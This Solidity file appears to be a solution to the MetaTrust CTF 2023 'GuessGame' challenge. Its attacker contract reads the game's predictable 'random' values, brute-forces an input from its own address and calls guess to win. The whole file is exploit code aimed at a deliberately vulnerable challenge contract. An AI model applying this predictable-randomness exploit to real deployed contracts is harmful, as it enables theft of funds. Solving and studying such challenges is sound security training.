// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "src/MetaTrustCTF_2023/GuessGame/GuessGame.sol";

contract GuessGameAttack {
    A public a ;
    GuessGame public guessGame;
    Setup public setup;
    function attack(address target) public payable {
        setup = Setup(target);
        a = setup.a();
        guessGame = setup.guessGame();
        // console2.log(guessGame.random01()); // 1
        // console2.log(guessGame.random02()); // 2
        // console2.log(guessGame.random03()); // 32  or read their value by decompiling
        // console2.log(a.number());  // 10

        uint v2 = 0;
        while (v2 < 256) {
            uint256 y = (uint160(address(this)) + 1 + 2 + 32 + v2) & 0xff;
            if (y == 2) {
                break;
            }
            v2 += 1;
        }
        guessGame.guess{value:1}(0x60, v2, 3, 10);

        
    }

    receive() external payable {}
}